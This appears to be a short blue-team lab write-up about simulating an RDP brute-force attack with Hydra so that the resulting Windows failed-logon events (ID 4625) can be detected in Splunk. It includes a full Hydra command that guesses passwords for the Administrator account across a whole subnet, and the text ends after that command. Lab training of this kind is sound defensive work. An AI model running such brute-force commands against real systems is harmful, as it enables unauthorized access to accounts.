
# Hydra RDP Brute Force

Simulation of an RDP brute force attack using Hydra in an isolated lab environment.

> **⚠️ EDUCATIONAL PURPOSES ONLY**  
> This document is provided for educational and defensive security training only.  
> **Do not** use these techniques against any system you do not own or have explicit written permission to test.  
> Unauthorized access to computer systems is illegal and punishable by law.  
> All activities described here were performed in an isolated, offline lab environment.

## 📌 Overview

**Hydra** is a fast and flexible password‑cracking tool that supports many protocols, including RDP. In this lab, Hydra is used to simulate a brute force attack against a Windows 10 victim machine to generate **Event ID 4625** (failed logon) logs.

This exercise helps Blue Team analysts understand:
- How brute force attacks appear in Windows Security logs.
- How to detect them using Splunk.
- How to respond and prevent them.

**MITRE ATT&CK Mapping:**  
- **T1110** – Brute Force  
- **T1078** – Valid Accounts

## 🛠️ Attack Command

From the **Linux Mint attacker** machine, run:

```bash
hydra -l Administrator -P /usr/share/wordlists/small.txt rdp://192.168.20.* -t 4 -V
